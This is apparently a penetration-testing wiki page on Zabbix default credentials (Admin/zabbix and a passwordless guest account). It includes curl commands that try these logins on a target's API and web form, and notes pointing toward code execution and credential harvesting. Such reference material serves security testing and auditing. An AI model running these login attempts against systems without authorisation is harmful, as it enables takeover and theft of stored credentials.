---
title: "Default credentials: Admin/zabbix and the guest account"
description: "Zabbix ships with a Super admin account, Admin with the password zabbix, and historically an enabled guest account with no password. These defaults are frequently left unchanged, so trying Admin/zabbix on the web login or the API is the first and highest-yield move, granting full administrative control that leads directly to code execution."
keywords:
  - admin zabbix
  - default credentials
  - guest
  - super admin
  - zabbix login
---

# Default credentials

Zabbix's default Super admin account is `Admin` (capital A) with the password `zabbix`, and it is unchanged on a large share of real installations, because operators focus on monitoring configuration and overlook the login. Historically a `guest` account was also enabled by default (no password) for read access. So the first action against any Zabbix instance is to try `Admin`/`zabbix` on the web login and the API, and to check for `guest`. A working `Admin`/`zabbix` is immediate Super admin: full configuration access, the user and host inventory with its stored credentials, and the script-execution feature that gives code execution on the server and agents.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# the default super admin
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}'
# via the web login form
curl -sk -c cj https://<target>/zabbix/index.php \
  --data 'name=Admin&password=zabbix&enter=Sign+in&autologin=1'
# check guest (older defaults)
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"guest","password":""},"id":1}'
```

## Exploitation notes

- `Admin`/`zabbix` is the canonical default and grants Super admin; it is the single highest-yield check, so try it first on both the web form and the API.
- The username is case-sensitive (`Admin`, not `admin`); a lowercase attempt fails even when the default is set.
- A present `guest` account (empty password) grants read access even without the admin; see [Guest access](guest-access.md).
- Super admin access leads straight to [code execution](../code-execution/index.md) via scripts and to harvesting the [host](../enumeration/host.md) macros; treat a default-credential hit as full platform compromise.

## References

- [Zabbix: default users](https://www.zabbix.com/documentation/current/en/manual/quickstart/login)
- [HackTricks: Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
